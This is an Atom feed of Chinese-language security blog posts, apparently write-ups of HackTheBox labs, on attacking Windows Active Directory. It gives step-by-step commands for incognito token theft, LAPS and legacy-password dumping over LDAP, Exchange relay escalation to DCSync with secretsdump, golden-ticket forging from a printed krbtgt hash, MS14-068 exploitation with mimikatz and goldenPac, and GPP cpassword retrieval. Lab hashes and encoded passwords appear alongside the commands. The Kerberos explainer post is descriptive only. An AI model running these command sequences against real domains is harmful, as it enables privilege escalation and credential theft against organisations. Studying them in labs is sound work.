<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Twe1ve&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/"/>
  <updated>2020-04-26T02:48:39.678Z</updated>
  <id>https://github.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>incognito Stealing Windows Access Tokens</title>
    <link href="https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"/>
    <id>https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/</id>
    <published>2020-04-26T02:18:58.000Z</published>
    <updated>2020-04-26T02:48:39.678Z</updated>
    
    <content type="html"><![CDATA[<p>使用incognito可以窃取令牌以任意用户身份执行任意命令或payload</p><p>得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌<br>列出域管理组成员：</p><pre><code>net groups &quot;Domain Admins&quot; /domain</code></pre><p><strong>0x01、ACCESS TOKEN(访问令牌)：</strong></p><p>当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权</p><p>Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌</p><p><strong>0x02、令牌类型</strong></p><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p><p>这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。</p><p><strong>0x03、本地和远程的基本用法</strong></p><p><strong>本地：</strong> </p><p>查看 token：</p><p><code>incognito.exe list_tokens–u</code> </p><p>获取到已注销用户 int18\administrator的token,盗取token 执行命令： </p><pre><code>incognito.exe execute -c &quot;int18\administrator&quot; calc.exe </code></pre><p><strong>远程：</strong></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u</code></pre><p><img src="1.png" alt=""></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe </code></pre><p><img src="2.png" alt=""></p><p><strong>0x04、提权、降权、伪造（以本地示例)</strong></p><pre><code>incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 </code></pre><p>0x03、获取TrustedInstaller 权限（修改系统文件）<br>管理员、System 均无法修改系统文件、需 TrustedInstaller 权限<br><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限</a></p><p>在CS下获取TrustedInstaller </p><blockquote><p>shell sc strat TrustedInstaller </p></blockquote><blockquote><p>steal token  1700 ##ps查看TrustedInstaller进程号</p></blockquote><blockquote><p>shell whoami /groups</p></blockquote><p>链接：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p><a href="https://blog.csdn.net/qq_36374896/article/details/84261516" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84261516</a>  </p><p><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</a> </p><p><a href="https://www.jianshu.com/p/907c6aab6fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/907c6aab6fd0</a></p><p><a href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf" target="_blank" rel="noopener">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用incognito可以窃取令牌以任意用户身份执行任意命令或payload&lt;/p&gt;
&lt;p&gt;得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌&lt;br&gt;列出域管理组成员：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net groups &amp;quot
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透之AD Recyle Bin组利用+Ldaps信息枚举</title>
    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"/>
    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</id>
    <published>2020-04-26T01:14:42.000Z</published>
    <updated>2020-04-26T01:37:49.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="AD-Recyle-Bin组利用："><a href="#AD-Recyle-Bin组利用：" class="headerlink" title="AD Recyle Bin组利用："></a>AD Recyle Bin组利用：</h2><p>使用回收站还原用户，或获取用户旧密码进行碰撞</p><p>前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中</p><p><strong>未启用启用回收站和启用回收站删除对象对比</strong></p><p>图1：启用回收站之前已删除的Active Directory对象的生命周期</p><p><img src="1.jpg" alt=""></p><p>图2：启用回收站后已删除的Active Directory对象的生命周期</p><p><img src="2.jpg" alt=""></p><p>启用AD回收站：</p><pre><code>Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’</code></pre><p>查看删除用户</p><pre><code>Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects</code></pre><p>结果示例：</p><pre><code>Deleted           : TrueDistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=localName              : TempAdmin                DEL:f0cc344d-31e0-4866-bceb-a842791ca059ObjectClass       : userObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059</code></pre><p>尝试还原已删除账户</p><pre><code>Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原</code></pre><p>或</p><pre><code>Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject</code></pre><p>查询ms-mcs-admpwd</p><pre><code>Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  </code></pre><p>查看有关于特定账户的全部属性信息：</p><pre><code>Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></pre><p>如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来</p><h2 id="Ldap枚举：获取基本的账户信息、密码"><a href="#Ldap枚举：获取基本的账户信息、密码" class="headerlink" title="Ldap枚举：获取基本的账户信息、密码"></a>Ldap枚举：获取基本的账户信息、密码</h2><p>ldapsearch 使用：<br>列出基本的上下文信息</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts</code></pre><p>提取整个域目录的数据，然后grep筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.outroot@kali:$ cat ldap.out |grep -i memberof</code></pre><p>筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType</code></pre><p>列出管理用户组</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberof</code></pre><p>Dump LAPS passwords:</p><pre><code>kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd</code></pre><p>同样windapsearch也是一个不错的工具</p><pre><code>kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users...user:r.thompsoncascadeLegacyPwd: clk0bjVldmE=...</code></pre><p><a href="https://github.com/snovvcrash/cheatsheets/tree/master">https://github.com/snovvcrash/cheatsheets/tree/master</a> </p><p><a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html" target="_blank" rel="noopener">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;AD-Recyle-Bin组利用：&quot;&gt;&lt;a href=&quot;#AD-Recyle-Bin组利用：&quot; class=&quot;headerlink&quot; title=&quot;AD Recyle Bin组利用：&quot;&gt;&lt;/a&gt;AD Recyle Bin组利用：&lt;/h2&gt;&lt;p&gt;使用回收站还原用户，
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之Exchange提权</title>
    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"/>
    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/</id>
    <published>2020-04-25T16:09:28.000Z</published>
    <updated>2020-04-25T16:32:53.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理-："><a href="#原理-：" class="headerlink" title="原理 ："></a>原理 ：</h2><p>Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync</p><p>也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>net group 查看用户组</p><p><img src="1.png" alt=""></p><p>或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组</p><p>添加用户tw：</p><pre><code>$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -ForceNew-ADUser tw -AccountPassword $pass -Enabled $True</code></pre><p>将用户添加到Exchange Permissions组</p><pre><code>net group &quot;Exchange Windows Permissions&quot; tw /add 或Import-Module ActiveDirectoryAdd-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw</code></pre><p>检查是否已成功添加</p><pre><code>net group &quot;Exchange Windows Permissions&quot; /domain </code></pre><p>使用ntlmrelayx.py进行ntlm中继：</p><pre><code>sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw</code></pre><p>运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接</p><pre><code>python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local</code></pre><p>（10.10.16.21为我kali ip）</p><p><img src="2.png" alt=""></p><p>连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示</p><pre><code>impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc</code></pre><p><img src="3.png" alt=""></p><p><strong>进一步学习：在Linux上使用KRBTGT hash实现金票攻击</strong></p><p>在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它</p><p>首先获取domain sid ：</p><pre><code>Get-ADDomain htb.localS-1-5-21-3072663084-364016917-1341370565</code></pre><p>使用NTLM生成TGT###TGT也可以使用AES-KEY生成</p><pre><code>python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit</code></pre><p>运行之后生成一个UserDoesnotExit.ccache缓存文件<br>使用ccache设置ticket</p><p><code>export KRB5CCNAME=UserDoesnotExit.ccache</code></p><p>使用TGT使用下列任意方式远程执行命令</p><pre><code>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</code></pre><p>执行之前需要同步域控时间，否则会出现下列错误<br>    sudo rdate 10.10.10.161</p><p><img src="4.png" alt=""></p><pre><code>python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass</code></pre><p>不能使用IP进行连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理-：&quot;&gt;&lt;a href=&quot;#原理-：&quot; class=&quot;headerlink&quot; title=&quot;原理 ：&quot;&gt;&lt;/a&gt;原理 ：&lt;/h2&gt;&lt;p&gt;Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteD
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之ms14-068</title>
    <link href="https://github.com/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"/>
    <id>https://github.com/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/</id>
    <published>2020-04-25T14:57:08.000Z</published>
    <updated>2020-04-25T15:10:07.667Z</updated>
    
    <content type="html"><![CDATA[<p>危害：任意域控用户都可以提权到域控<br>一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制</p><h2 id="一、漏洞成因"><a href="#一、漏洞成因" class="headerlink" title="一、漏洞成因"></a>一、漏洞成因</h2><p>在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，<strong>却允许任意签名算法</strong>。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 </p><p><strong>什么是PAC（特权帐户证书）：</strong></p><p>PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。<br>    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。</p><h2 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a>二、利用条件</h2><pre><code>1.域控机器没有打漏洞补丁      补丁号：KB30117802.拥有一台域内机子及其sid</code></pre><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>漏洞检测：<br>FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)</p><pre><code>./FindSMB2UPTime.py 192.168.31.220DC is up since: 2013-12-28 22:24:25This DC is vulnerable to MS14-068</code></pre><p>获取域控制器补丁状态:Get-DCPatchStatus.ps1</p><pre><code># This is an example script only.import-module activedirectory[string]$KBNumber = &quot;KB3011780&quot;$DomainControllers = Get-ADDomainController -filter *[int]$DomainControllersCount = $DomainControllers.Count[int]$PatchedDCCount = 0[int]$UnPatchedDCCount = 0$UnpatchedDCs = @()Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;ForEach ($DomainController in $DomainControllers){    $DomainControllerHostName = $DomainController.HostName    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue    IF ($PatchStatus.InstalledOn)        {            $PatchStatusInstalledOn = $PatchStatus.InstalledOn            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;            $PatchedDCCount++        }    Else        {            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;            [array]$UnpatchedDCs += $DomainController.HostName            $UnPatchedDCCount++        }}Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;IF ($UnpatchedDCs){    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;    $UnpatchedDCs}</code></pre><p>环境描述：</p><p>目标机器：10.10.10.52  Windows Server 2008 R2 Standard</p><p>已获取：DC上的一个普通本地账户</p><ul><li>james用户账户密码</li></ul><ul><li>james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）</li></ul><p>攻击机：kali 10.10.14.14  （不在域中）</p><h2 id="在Linux上：-没有目标shell的情况下"><a href="#在Linux上：-没有目标shell的情况下" class="headerlink" title="在Linux上：(没有目标shell的情况下)"></a>在Linux上：(没有目标shell的情况下)</h2><p>1.安装客户端，在客户端生成票证</p><pre><code>sudo apt-get install krb5-user cifs-utils rdate</code></pre><p>2./etc/hosts中添加：（内网机器没有映射，所以需要添加）</p><pre><code>10.10.10.52 htb.local htb mantis.htb.local  mantis</code></pre><p>3.编辑/etc/krb5.conf</p><pre><code>[libdefaults]    default_realm = HTB.LOCAL[realms]   HTB.LOCAL = {    kdc = mantis.htb.local:88    admin_server = mantis.htb.local    default_domain = HTB.LOCAL    }[domain_realm]    .domain.internal = HTB.LOCAL    domain.internal = HTB.LOCAL</code></pre><p>4.添加路由：编辑/etc/resolve.conf</p><pre><code>nameserver 10.10.10.52</code></pre><p>5.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）</p><ul><li><p>[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间</p></li><li><p>[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间</p></li></ul><p>6.为james用户生成一张新的Kerberos票证</p><pre><code>kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit jamesklist</code></pre><p><img src="1.png" alt=""></p><p>此时生成的是jame是的票证：访问C$是没有权限的</p><pre><code>kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -ktree connect failed: NT_STATUS_ACCESS_DENIED</code></pre><p>7.ms14-068生成高权限TGT票证</p><p><img src="2.png" alt=""></p><p>8.替换低权限票证</p><pre><code>mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_1000</code></pre><p>9.smb成功登录C$</p><p><img src="3.png" alt=""></p><h2 id="Mimikatz："><a href="#Mimikatz：" class="headerlink" title="Mimikatz："></a>Mimikatz：</h2><p>先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令</p><pre><code>ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</code></pre><p>将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中</p><pre><code>mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit</code></pre><p>注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket</p><pre><code>net use \\htb.local\admin$    ####使用IP可能会失败dir \\htb.local\c$ psexec  \\htb.local  cmd.exe</code></pre><p><strong>突破“本地账户才能漏洞利用”的限制</strong>：<br>先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接<br>原理：<a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/56081.html</a></p><p>GoldenPac,py<br>也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）</p><p><img src="4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;危害：任意域控用户都可以提权到域控&lt;br&gt;一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制&lt;/p&gt;
&lt;h2 id=&quot;一、漏洞成因&quot;&gt;&lt;a href=&quot;#一、漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞成因&quot;&gt;&lt;/a&gt;一
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Kerberos认证学习</title>
    <link href="https://github.com/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-25T13:49:57.000Z</published>
    <updated>2020-04-25T14:48:21.127Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Kerberos简介：</strong></p><ul><li><p>Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）</p></li><li><p>几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）</p></li><li><p>Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥</p></li></ul><p><img src="https://github.com/Twe1ve-web/Twe1ve-web.github.io/raw/master/images/keberos.jpg" alt=""></p><p><img src="keberos.jpg" alt=""></p><h2 id="1、AS-REQ"><a href="#1、AS-REQ" class="headerlink" title="1、AS-REQ"></a>1、AS-REQ</h2><p>Client将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS</p><h2 id="2、AS-REP"><a href="#2、AS-REP" class="headerlink" title="2、AS-REP"></a>2、AS-REP</h2><p>AS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    </p><p>AS向Clinet发送两条消息：        </p><p><strong>消息1</strong>包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;<strong>也就是使用TGS密钥加密TGT</strong></p><p>步骤1中用户提供的信息+TGS SESSION KEY                </p><p><strong>消息2</strong>包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     </p><pre><code>TGS名称/ID            时间戳            TGS SESSION KEYTGT生存期`</code></pre><p>消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY</p><h2 id="3、TGS-REQ"><a href="#3、TGS-REQ" class="headerlink" title="3、TGS-REQ"></a>3、TGS-REQ</h2><p>(金票攻击发生在此步骤)</p><p>Client向TGS发送两条消息<br><strong>消息1</strong>：[使用TGS SESSION KEY进行加密]  </p><pre><code>你的名称/ID时间戳`</code></pre><p><strong>消息2</strong>：[未加密消息]</p><pre><code>所要请求服务的名称/ID服务的有效生存期</code></pre><p>同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在</p><h2 id="4、-TGS-REPTGS"><a href="#4、-TGS-REPTGS" class="headerlink" title="4、   TGS-REPTGS"></a>4、   TGS-REPTGS</h2><p>使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    </p><pre><code>步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟检查TGT是否过期检查TGS缓存中是否已有该用户凭据，避免重播</code></pre><p>检查无误之后，同样向客户端发送两条消息</p><p><strong>消息1</strong>：[<strong>生成的使用Service Secret Key加密后的TGS</strong>]—-&gt;<strong>Kerberos令牌</strong></p><p><strong>消息2</strong>：[TGS Session Key加密]    </p><pre><code>服务名称/ID   时间戳    票据生存期    Service Session Key</code></pre><h2 id="5、AP-REQ"><a href="#5、AP-REQ" class="headerlink" title="5、AP-REQ"></a>5、AP-REQ</h2><p>银票攻击发生在此步骤</p><p>Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    </p><pre><code>用户名称/ID时间戳`</code></pre><p>该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源</p><h2 id="6、AP-REP"><a href="#6、AP-REP" class="headerlink" title="6、AP-REP"></a>6、AP-REP</h2><p>启用相互认证的情况下，交换时间戳进行相互认证</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Kerberos简介：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）&lt;/p&gt;
&lt;/li&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域内提权之滥用GGP</title>
    <link href="https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"/>
    <id>https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/</id>
    <published>2020-04-25T13:49:13.000Z</published>
    <updated>2020-04-25T14:46:47.301Z</updated>
    
    <content type="html"><![CDATA[<p>在SYSVOL查找密码组策略首选项（GPP）中的密码</p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><strong>什么是GPP</strong></p><p>GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途</p><p>一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。</p><p>该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）</p><p>这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）</p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><p>连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：</p><pre><code>\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</code></pre><p><strong>1、定位域控制器</strong></p><pre><code>set l   nltest /DSGETDC:echo %logonserver%net time /domain......</code></pre><p><strong>2、查询DC共享目录</strong><br>使用enumlinux或者smbmap检查共享目录：</p><pre><code>smbmap -H 10.10.10.100  ###列出目标用户共享列表---- -----------ADMIN$ NO ACCESSC$ NO ACCESSIPC$ NO ACCESSNETLOGON NO ACCESSreplication read only   SYSVOL NO ACCESSUsers NO ACCESS</code></pre><p><strong>3、连接域共享</strong></p><p>smbclient //active.htb/Replication -N</p><pre><code>smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; 